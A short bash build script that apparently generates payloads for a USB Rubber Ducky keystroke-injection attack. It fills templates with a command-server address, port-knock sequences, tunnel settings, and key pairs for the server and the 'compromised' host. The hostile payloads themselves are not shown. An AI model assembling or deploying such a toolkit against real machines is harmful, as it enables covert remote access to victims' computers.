#!/bin/bash
set -euo pipefail

# We need a lot of info in one script file, so this substitutes all env
# variables in the script.sh to make it specific to our install
if [[ -d payload ]]
then
    rm -rf payload
fi

. .env

mkdir payload

envsubst "\$C_SERVER \$PAYLOAD_PATH \$KNOCK_OPEN_HTTP \$KNOCK_OPEN_HTTPS" < ducky/ducky_script.txt > payload/ducky.txt
envsubst "\$KNOCK_OPEN_TUNNEL \$C_SERVER \$SERVER_TUNNEL_PORT \$SERVER_IP \$SERVER_PUBLIC_KEY \$COMPROMISED_PUBLIC_KEY \$COMPROMISED_PRIVATE_KEY" < compromised_blueprint/compromised.bash > payload/payload.bash
envsubst < server_blueprint/server.bash > payload/server_payload.bash


